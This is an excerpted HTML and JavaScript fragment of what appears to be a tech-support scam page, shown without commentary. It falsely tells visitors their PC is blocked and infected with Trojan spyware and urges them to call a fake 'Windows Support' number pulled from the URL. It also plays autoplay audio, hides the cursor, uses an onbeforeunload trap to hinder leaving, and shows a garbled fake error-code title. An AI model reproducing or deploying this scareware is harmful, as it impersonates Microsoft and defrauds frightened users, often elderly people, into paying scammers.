...
<script>
  ...
  plausible('pageview', { u: prepareUrl(["phone", "clickid","aezp","cezp","rezp","click","wezp","qezp"]) });
    ...
    <title>_*//_/PirRated**_*C0mputer*_err*or_Co0de_#0x00x9xjsr786//bx7**||</title>
...
var phone_number2 = getVariableFromURl('phone');
  ...
  <body class="map" id="mycanvas" onbeforeunload="return myFunction()"  style="cursor:none">
    <audio autoplay="" id="pridez">
      <source src="hk09jsrk786x.mp3" type="audio/mpeg">
    </audio>
    ...
    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
      ...
      <p>
        <b>ACCESS TO THIS PC IS NOW BLOCKED FOR SECURITY REASONS</b>
      </p>
      <p>Your computer has been reported to us that it has been infected with Trojan-type spyware. The following data has been compromised.</p>
    ...
    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#fff;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">You should contact us immediately so that our engineers can guide you through the removal process by phone. <br>Your computer is disabled.<br>
        <strong>Call Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> <script>document.write(phone)</script>
          </span>
        </strong>
      </p>
    </div>
...
<script>
  $(document).ready(function() {
   ...
   audioElement.setAttribute('src', 'jskrk09x786x.mp4');
